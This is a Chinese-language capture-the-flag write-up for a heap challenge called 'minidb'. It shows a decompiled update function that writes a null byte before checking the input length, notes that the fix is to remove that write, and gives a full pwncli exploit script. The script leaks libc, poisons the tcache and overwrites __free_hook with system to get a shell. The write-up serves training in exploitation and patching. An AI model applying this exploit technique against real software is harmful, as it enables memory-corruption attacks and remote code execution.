# minidb

> 不知道是我的水平下降了还是今年题目难度整体又上升了，总感觉最近遇到的赛题质量都挺高的，就连这道签到题也没有在比赛中做出来。

## Analysis

漏洞主要出现在键值对更新的函数中：

```c
unsigned __int64 __fastcall update_value_by_key(database *a1)
{
  int u_tmp_strlen; // [rsp+1Ch] [rbp-224h]
  __int64 key; // [rsp+20h] [rbp-220h] BYREF
  key_value_pair *value_by_key_addr; // [rsp+28h] [rbp-218h]
  char s[520]; // [rsp+30h] [rbp-210h] BYREF
  unsigned __int64 v6; // [rsp+238h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  if ( a1 )
  {
    printf("Input the key: ");
    __isoc99_scanf("%ld", &key);
    value_by_key_addr = inner_find_value_by_key(a1, key, 0LL);
    if ( value_by_key_addr )
    {
      printf("Input the new value: ");
      __isoc99_scanf("%255s", s);
      u_tmp_strlen = strlen(s);
      value_by_key_addr->value[u_tmp_strlen] = 0; 		// 先写 0，后检查
      if ( (a1->database_type == 1 || a1->database_type == 2) && u_tmp_strlen > 127
        || (a1->database_type == 3 || a1->database_type == 4) && u_tmp_strlen > 255 )
      {
        puts("\x1B[31m\x1B[1m[x] The length of new value is TOOOOOO LOOOOONG!\x1B[0m");
      }
      else
      {
        memcpy(value_by_key_addr->value, s, u_tmp_strlen);
        value_by_key_addr->value[u_tmp_strlen] = 0;
        puts("[+] Succesfully update the value of specific key!");
      }
    }
    else
    {
      puts("\x1B[31m\x1B[1m[x] Key NOT FOUND!\x1B[0m");
    }
  }
  else
  {
    puts("\x1B[31m\x1B[1m[x] Runtime error! No database provided!\x1B[0m");
  }
  return __readfsqword(0x28u) ^ v6;
}
```

这里在读入 value 后会先写 0 再检查 size，我们就可以利用 128 的值去堆上溢出写 0 实现 2.31 版本下的 `off_by_null`，因此在 awdp 赛制下这道题的 patch 就直接把这句溢出写 0 nop 掉就可以通过了。

---

## Exploitation

在攻击时并不需要去强行凑 off_by_null 的打法，因为这个漏洞可以在堆块后面 128 字节内任意地址写 0，因此这里考虑写 database 的 name 指针完成泄露与最终 tcache 利用：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c: str(c).encode()
lg = lambda s: log.info("\033[1;31;40m %s --> 0x%x \033[0m" % (s, eval(s)))
debugB = lambda: input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)


def db_cmd(choice):
    ru(b"Your choice: ")
    sl(i2b(choice))


def create_db(name, db_type):
    db_cmd(1)
    ru(b"Please input the name of database: ")
    sl(name)
    ru(b"Please input the type of database: ")
    sl(i2b(db_type))


def use_db(name):
    db_cmd(2)
    ru(b"Please input the name of database: ")
    sl(name)


def add_valuekey(key, value):
    ru(b"Your choice: ")
    sl(i2b(1))
    ru(b"Input the key: ")
    sl(i2b(key))
    ru(b"Input the value: ")
    sl(value)


def show_valuekey(key):
    ru(b"Your choice: ")
    sl(i2b(2))
    ru(b"Input the key: ")
    sl(i2b(key))


def edit_valuekey(key, value):
    ru(b"Your choice: ")
    sl(i2b(3))
    ru(b"Input the key: ")
    sl(i2b(key))
    ru(b"Input the new value: ")
    sl(value)


def delete_valuekey(key):
    ru(b"Your choice: ")
    sl(i2b(4))
    ru(b"Input the key: ")
    sl(i2b(key))


def leave_op():
    ru(b"Your choice: ")
    sl(i2b(666))


def delete_db(name):
    db_cmd(3)
    ru(b"Please input the name of database: ")
    sl(name)


def show_db():
    db_cmd(4)

def change_dbname(dbname, newname):
    db_cmd(5)
    ru(b'Please input the name of database: ')
    sl(dbname)
    ru(b'Please input the new name for database: ')
    sl(newname)



# leak libc base first
attacker_database = b"eastXueLian".ljust(0x70, b"a")
create_db(attacker_database, 2)
use_db(attacker_database)
for i in range(9):
    add_valuekey(i, b"a")
for i in range(6):
    delete_valuekey(i)
delete_valuekey(7)
delete_valuekey(6)

leave_op()
create_db(b"a"*0x90, 2)

use_db(attacker_database)
edit_valuekey(8, b"a"*0x98)
leave_op()

show_db()
ru(b"\t")
ru(b"\t")
leak = ru(b"\n", drop=True)
libc_base = u64_ex(leak) - 0x100 - libc.sym.__malloc_hook
lg("libc_base")


# tcache attack
use_db(leak)
for i in range(7):
    add_valuekey(i, b"aaa")
for i in range(5):
    delete_valuekey(i)
delete_valuekey(6)
leave_op()

show_db()
ru(b"\t")
ru(b"\t")
leak = ru(b"\n", drop=True)
change_dbname(leak, p64(libc_base + libc.sym.__free_hook - 0x10))

create_db(b"sh", 3)

use_db(attacker_database)
add_valuekey(0xde, b"eastXueLian")
add_valuekey(0xad, p64(libc_base + libc.sym.system))
leave_op()

delete_db(b"sh")

ia()
```
